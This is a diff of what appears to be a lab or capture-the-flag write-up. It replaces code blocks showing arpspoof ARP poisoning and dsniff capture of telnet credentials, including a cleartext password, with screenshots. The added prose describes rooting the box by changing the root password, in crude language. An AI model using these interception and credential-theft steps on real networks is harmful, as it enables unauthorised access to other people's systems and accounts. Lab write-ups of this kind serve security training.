@@ -104,53 +104,15 @@ Using Wireshark I saw there was a TELNET connection going to an IP that did not 
 
 First, I stole the IPs with arp poisoning as such:
 
-
-```
-root@battlestation:~# arpspoof -i eth0 -t 192.168.248.129 192.168.248.1
-0:c:29:c6:16:b 0:c:29:11:c:39 0806 42: arp reply 192.168.248.1 is-at 0:c:29:c6:16:b
-0:c:29:c6:16:b 0:c:29:11:c:39 0806 42: arp reply 192.168.248.1 is-at 0:c:29:c6:16:b
-0:c:29:c6:16:b 0:c:29:11:c:39 0806 42: arp reply 192.168.248.1 is-at 0:c:29:c6:16:b
-
-```
-
-and
-
-```
-arpspoof -i eth0 -t 192.168.248.129 172.16.57.130
-0:c:29:c6:16:b 0:c:29:11:c:39 0806 42: arp reply 172.16.57.130 is-at 0:c:29:c6:16:b
-0:c:29:c6:16:b 0:c:29:11:c:39 0806 42: arp reply 172.16.57.130 is-at 0:c:29:c6:16:b
-0:c:29:c6:16:b 0:c:29:11:c:39 0806 42: arp reply 172.16.57.130 is-at 0:c:29:c6:16:b
-```
+![ARPspoof #2](arpspoof2.png)
 
 Then, I listened for TELNET connections, and got this:
 
-```
-root@battlestation:~# dsniff -t 23/tcp=telnet -n
-dsniff: listening on eth0
------------------
-10/28/14 03:31:48 tcp 172.16.57.129.27008 -> 172.16.57.130.23 (telnet)
-john
-meTarzanSuperUser
-sudo su +-
-meTarzanSuperUser
-AiAiAi....
+![TELNET Sniffing with dsniff](telnet.png)
 
------------------
+I continued with logging into telnet, realizing John is stupid as fuck and sends his sudo password in cleartext, I could easily change the root password to `pwnd` and voíla! Rooted, bitch!
 
-tarzan
-meTarzanSuperUser
-root
-admin
-meTarzanSuperUser
-
------------------
-10/28/14 03:36:49 tcp 172.16.57.129.27008 -> 172.16.57.130.23 (telnet)
-john
-meTarzanSuperUser
-sudo su +-
-meTarzanSuperUser
-AiAiAi....
-```
+![PWND](pwnd.png)
 
 
 #### Shellshock
